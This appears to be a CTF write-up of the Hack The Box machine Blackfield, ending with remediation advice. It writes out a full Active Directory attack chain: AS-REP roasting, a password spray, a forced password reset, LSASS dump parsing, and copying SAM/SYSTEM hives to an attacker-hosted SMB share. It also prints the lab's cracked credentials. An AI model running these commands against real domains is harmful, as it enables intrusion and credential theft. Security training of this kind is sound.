# Blackfield — Hack The Box

<p align="left">
  <img src="./assets/blackfield/00-card.png" alt="Blackfield HTB machine card" width="650">
</p>

| | |
|---|---|
| **Platform** | Hack The Box |
| **Difficulty** | Hard |
| **OS** | Windows (Active Directory) |
| **Key techniques** | Anonymous SMB user enum, AS-REP Roasting, `ForceChangePassword` via `net rpc`, LSASS dump analysis with **pypykatz**, `SeBackupPrivilege` → NetExec `backup_operator` module |

---

## TL;DR

Blackfield gives up a full domain compromise through five clean AD
primitives stacked on top of each other:

1. Anonymous read of the `profiles$` SMB share leaks the user list from
   folder names.
2. That list feeds `GetNPUsers.py` — `support` has `DONT_REQ_PREAUTH`,
   so an AS-REP hash pops out and cracks in seconds.
3. BloodHound shows `support` has `ForceChangePassword` on `audit2020`,
   so `net rpc password` resets `audit2020` without ever knowing its
   old password.
4. `audit2020` unlocks the `forensic` share, which contains a zipped
   **`lsass.DMP`** memory dump. `pypykatz` parses it offline and
   returns NT hashes for `svc_backup` and (misleadingly) the local
   **DSRM** `Administrator`.
5. `svc_backup` is a Backup Operator with `SeBackupPrivilege`. Instead
   of the manual `reg save` dance, NetExec's `backup_operator` module
   dumps `SAM`/`SYSTEM`/`SECURITY` remotely and pulls the **domain**
   Administrator's cleartext password straight out of it.

Along the way the box hands out three different Administrator
credentials — a great illustration of why "I have an Administrator
hash" is not the same as "I have Domain Admin".

---

## Recon

```bash
sudo nmap -p- -T4 10.129.229.17
sudo nmap -p- -A -T4 10.129.229.17
```

![nmap TCP sweep](./assets/blackfield/01-nmap.png)
![nmap -A version + OS + host scripts](./assets/blackfield/02-nmap-scripts.png)

Domain controller for `BLACKFIELD.local` — SMB, LDAP, Kerberos and
WinRM. Textbook AD attack surface.

---

## Anonymous SMB — the user list

Guest / null SMB enumeration exposes `profiles$`:

```bash
smbclient -N -L //10.129.229.17
smbclient -N //10.129.229.17/profiles$
```

![profiles$ readable anonymously](./assets/blackfield/03-smb-profiles.png)

Inside `profiles$`, every domain user has an empty folder named after
their SAM name — a **free user list**, no credentials required.

![raw ls of profiles$](./assets/blackfield/04-user-list-raw.png)

I dumped the listing and cleaned it into a plain wordlist:

```bash
smbclient -N //10.129.229.17/profiles$ -c 'ls' \
  | awk '{print $1}' | sed '/^\.$\|^\.\.$\|^$/d' > users.txt
wc -l users.txt
```

![cleaned users.txt](./assets/blackfield/05-user-list-cleaned.png)

---

## AS-REP Roasting — `support`

With a real user list, the fastest first swing at a DC is
`GetNPUsers`: it asks the KDC for an AS-REP for each user, and any
account with **`DONT_REQ_PREAUTH`** gives back a `krb5asrep$23$...`
hash that's crackable offline. Piping through `grep -v` drops the
noisy `KDC_ERR_C_PRINCIPAL_UNKNOWN` lines for names that don't map to
real accounts:

```bash
impacket-GetNPUsers blackfield.local/ -no-pass \
  -usersfile users.txt -dc-ip 10.129.229.17 \
  | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'
```

Almost everyone comes back with **`doesn't have UF_DONT_REQUIRE_PREAUTH
set`** — except **`support`**, which coughs up an AS-REP hash:

![GetNPUsers finds support](./assets/blackfield/07-asrep-hash-support.png)

Hashcat mode `18200` + `rockyou`:

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
```

![hashcat cracks support → #00^BlackKnight](./assets/blackfield/08-hashcat-crack.png)

Password: `#00^BlackKnight`.

### Password spray — sanity check

Before pivoting, I sprayed the recovered password across the whole
user list — it's cheap, and password reuse is normal in real
environments. NetExec makes this a one-liner:

```bash
nxc smb 10.129.229.17 -u users.txt -p password.txt --continue-on-success
```

![password spray across the user list](./assets/blackfield/06-getnpusers.png)

Every account authenticates as **Guest** with `#00^BlackKnight` — so
this password isn't unique to `support`, but it also doesn't give
Guest access to any share worth mentioning. The one interesting
result: **`audit2020` fails with `STATUS_LOGON_FAILURE`**, which
means `audit2020` has a *different* password. That's the account the
box wants me to escalate to.

Confirmed the `support` creds cleanly:

```bash
nxc smb 10.129.229.17 -u support -p '#00^BlackKnight'
```

![valid creds for support](./assets/blackfield/09-support-valid.png)

---

## BloodHound — `ForceChangePassword` on `audit2020`

Now that I can authenticate, I collected with `bloodhound-python`:

```bash
bloodhound-python -u support -p '#00^BlackKnight' \
  -d blackfield.local -c All -ns 10.129.229.17
```

![bloodhound collection](./assets/blackfield/10-bloodhound-collect.png)

Marking `support` as owned and running "Shortest paths from owned"
lights up `SUPPORT@BLACKFIELD.LOCAL` → **`ForceChangePassword`** →
`AUDIT2020@BLACKFIELD.LOCAL`:

![ForceChangePassword edge to audit2020](./assets/blackfield/11-bloodhound-forcechangepassword.png)

`ForceChangePassword` (aka "User-Force-Change-Password" extended
right) lets `support` **set** a new password for `audit2020` **without
knowing the current one**. `net rpc password` is the classic way to
abuse it from Linux:

```bash
net rpc password "audit2020" "Password123" -U "blackfield.local"/"support"%'#00^BlackKnight' -S 10.129.229.17
```

![net rpc password reset](./assets/blackfield/12-net-rpc-reset.png)
![audit2020 authenticates with the new password](./assets/blackfield/13-audit2020-new-password.png)

Ethical note: on a real engagement this is disruptive — you're
changing someone's password. Fine on retired HTB, but on client work
you'd coordinate a window and reset it back at the end.

---

## Forensic share — LSASS in a zip

With `audit2020` I can see a share that `support` couldn't:
**`forensic`**.

![new share visible: forensic](./assets/blackfield/14-forensic-share.png)
![forensic/memory_analysis contents](./assets/blackfield/15-forensic-listing.png)

`memory_analysis/` contains a handful of `.zip` files, each a process
memory dump. The interesting one is obvious:

```bash
smbclient //10.129.229.17/forensic -U 'audit2020%Password123' \
  -c 'cd memory_analysis; prompt OFF; recurse ON; mget *.zip'
```

![downloading the dumps](./assets/blackfield/16-download-zips.png)
![lsass.zip in hand](./assets/blackfield/17-lsass-zip.png)

```bash
7z x lsass.zip
```

![unzipped lsass.DMP](./assets/blackfield/18-lsass-unzipped.png)

### pypykatz — mimikatz offline, in Python

I don't want to load Mimikatz on a live host if I don't have to.
`pypykatz` parses `lsass.DMP` **offline** in pure Python — same output,
no AV surface on the target:

```bash
pip install pypykatz
pypykatz lsa minidump lsass.DMP
```

![installing pypykatz](./assets/blackfield/19-pypykatz-install.png)

The dump has three logon sessions worth caring about:

- **`svc_backup`** NT hash — a domain service account:

  ![svc_backup logon session](./assets/blackfield/20-pypykatz-svc-backup.png)
  ![clean svc_backup NT hash](./assets/blackfield/21-svc-backup-nt-hash.png)

- **`Administrator@BLACKFIELD`** — a real Domain Admin session that
  was active on the DC when the dump was taken, NT hash
  `7f1e4ff8c6a8e6b6fcae2d9c0572cd62`:

  ![Domain Administrator NT hash from pypykatz](./assets/blackfield/31-administrator-nt-hash.png)

- **`DC01$`** machine account hash (interesting for silver tickets /
  RBCD, not needed here):

  ![DC01$ machine account hash](./assets/blackfield/32-dsrm-vs-domain-hash.png)

The Domain Administrator hash is technically enough to `wmiexec` or
`psexec` in, but the RM management group on Blackfield doesn't accept
it via WinRM. I need something better — and I already have the
prerequisite: `svc_backup` with `SeBackupPrivilege`.

---

## Foothold as `svc_backup` (Pass-the-Hash)

`svc_backup` is in **Remote Management Users**, so evil-winrm accepts
its hash directly — no cracking needed:

```bash
evil-winrm -i 10.129.229.17 -u svc_backup -H <NT-hash>
```

![evil-winrm as svc_backup](./assets/blackfield/22-evilwinrm-svc-backup.png)
![user.txt](./assets/blackfield/23-user-flag.png)

---

## Privilege Escalation — `SeBackupPrivilege`

`whoami /priv` on `svc_backup`:

![SeBackupPrivilege enabled](./assets/blackfield/24-whoami-priv.png)

`SeBackupPrivilege` lets the holder read **any** file on the filesystem
regardless of ACLs — including the registry hives. That is enough to
walk off the DC with the SAM database and the LSA secrets.

### The manual way (works, but noisy)

For understanding, the canonical chain is: open a shell on the DC as
`svc_backup`, `reg save` the `SAM` and `SYSTEM` hives, drag them back
to Kali over SMB, and run `secretsdump` locally.

Shell back in as `svc_backup`:

```bash
evil-winrm -i 10.129.229.17 -u svc_backup -H <NT-hash>
```

![evil-winrm shell as svc_backup](./assets/blackfield/25-shell.png)

Host a share on the attacker box:

```bash
impacket-smbserver share ./ -smb2support
```

![impacket-smbserver serving my working dir](./assets/blackfield/26-smbserver-host.png)

On the DC, save the two hives that matter:

```powershell
reg save hklm\sam    C:\TEmp\sam
reg save hklm\system C:\TEmp\system
dir C:\TEmp
```

![reg save sam + system on the DC](./assets/blackfield/27-reg-save-sam-system.png)

Copy them to the share I'm hosting on Kali:

```powershell
copy sam    \\10.10.14.90\share
copy system \\10.10.14.90\share
```

![hives copied to my SMB server](./assets/blackfield/28-copy-sam-system.png)

Then parse them locally:

```bash
impacket-secretsdump -system system -sam sam local
```

![impacket-secretsdump on the exfiltrated hives](./assets/blackfield/30-nxc-admin-cleartext.png)

That gives back the **local SAM** hashes — including
`Administrator:500:...:67ef902eae0d740df6257f273de75051`. Important:
that `Administrator:500` is the DC's **local** account, not the
domain one (see the "gotcha" below). It's not enough on its own — I
need the LSA secrets too.

### The clean way — NetExec `backup_operator` module

NetExec has a **`backup_operator`** module that does the whole thing
remotely: it uses `SeBackupPrivilege` to save `SAM`/`SYSTEM`/`SECURITY`
via the WinReg service, streams them back, and runs `secretsdump`
against them — one command, no files staged on the target:

```bash
nxc smb 10.129.229.17 -u svc_backup -H <NT-hash> -M backup_operator
```

![backup_operator dumping SAM + SYSTEM + SECURITY](./assets/blackfield/29-nxc-backup-operator.png)

This is the "new for me" bit of the box, and it's what I'm keeping in
muscle memory. Same primitive (`SeBackupPrivilege` → registry hives),
one command instead of ten. The output includes everything
`secretsdump` normally gives you, plus what the manual way missed —
the cached credentials from the SECURITY hive. One of those lines is:

```
(Unknown User):###_ADM1N_3920_###
```

That's the Domain Administrator's **cleartext** password, cached by
the DC. Game over.

### Gotcha — three different Administrator credentials

Blackfield hands out three different "Administrator" credentials in
three different places, and the first time you see them they're easy
to conflate:

| # | What | Where it comes from | Value on this box |
|---|---|---|---|
| 1 | **Domain Administrator NT hash** | `pypykatz` on the LSASS dump (Domain Admin was logged on the DC) | `7f1e4ff8c6a8e6b6fcae2d9c0572cd62` |
| 2 | **Local (DSRM) Administrator NT hash** | Local SAM — via `reg save` + `secretsdump local`, or the `Administrator:500` line in `backup_operator` output | `67ef902eae0d740df6257f273de75051` |
| 3 | **Domain Administrator cleartext** | LSA cached credentials in the SECURITY hive — the `(Unknown User)` line from `backup_operator` | `###_ADM1N_3920_###` |

The two NT hashes look identical in shape but represent two
different accounts (Local Administrator on the DC vs. Domain
Administrator in AD). Trying #2 as a Pass-the-Hash against
`Administrator` over WinRM returns `STATUS_LOGON_FAILURE` (visible
in the `backup_operator` output above) — because from the domain's
perspective, that hash belongs to a completely different SID.

The lesson: an `Administrator` hash from a DC isn't automatically
Domain Admin. Check the source (local SAM vs. LSA / LSASS) before
burning cycles on it.

### Root

The cleartext from `backup_operator` gets me straight in over WinRM:

```bash
evil-winrm -i 10.129.229.17 -u Administrator -p '###_ADM1N_3920_###'
```

![evil-winrm as Administrator](./assets/blackfield/33-evilwinrm-admin.png)
![root.txt](./assets/blackfield/34-root-flag.png)

---

## Lessons Learned

- **Anonymous `profiles$` = free user list.** Any share with per-user
  folders is a wordlist waiting to be scraped; always try `smbclient
  -N` first, before you have any credentials.
- **AS-REP Roast the moment you have a user list.** It's cheap, it's
  passive from an auth point of view, and `DONT_REQ_PREAUTH` is still
  common on service and legacy accounts.
- **`ForceChangePassword` is an "instant" privilege escalation over
  the wire** — no old password needed. `net rpc password` (Linux) and
  `Set-DomainUserPassword` (PowerView) both work. Note the disruption
  on real engagements.
- **`pypykatz` beats loading Mimikatz on the box.** Downloaded
  `lsass.DMP` → offline analysis on Kali → zero AV noise on the
  target.
- **`SeBackupPrivilege` on a DC = domain compromise.** Learn the
  primitive (read any file), then automate the ceremony —
  **`nxc … -M backup_operator`** does the whole SAM/SYSTEM/SECURITY
  dance in one line.
- **DSRM ≠ Domain Administrator.** Always sanity-check where an
  `Administrator` hash came from before you burn time trying to PtH
  with it.

---

## Remediation

- Remove anonymous access to `profiles$` (and any share that leaks
  user, computer or group names by folder structure). Least
  privilege on file shares is not optional on a DC subnet.
- Disable `DONT_REQ_PREAUTH` on all accounts unless a legacy system
  genuinely requires it — treat it like `AS-REP roast me`.
- Audit `ForceChangePassword` / `User-Force-Change-Password` grants;
  any low-privilege account with this right over a higher-privilege
  account is a straight escalation path.
- Do not leave process memory dumps on network shares. LSASS in a zip
  on a Forensic share is a domain compromise waiting to happen.
- Restrict `SeBackupPrivilege` to Tier-0 accounts only; make Backup
  Operators effectively "Domain Admin" and treat them accordingly.

---

## Tools used

- `nmap`, `smbclient`
- `impacket-GetNPUsers`
- `hashcat` (mode 18200)
- `bloodhound-python` + BloodHound GUI
- `net rpc password`
- `7z`, **`pypykatz`**
- `evil-winrm`
- **NetExec** (`nxc smb -M backup_operator`)
- Impacket (`smbserver.py`, `secretsdump.py`) — for the manual walkthrough

---

**See also:** [Active Directory methodology](../../methodology/active-directory.md)

---

**Machine:** [Hack The Box — Blackfield](https://www.hackthebox.com/machines/blackfield)

**Also on GitHub:** [this write-up in my security portfolio (methodology & cheat sheets)](https://github.com/debasjan/security-portfolio/blob/main/writeups/hackthebox/blackfield.md)
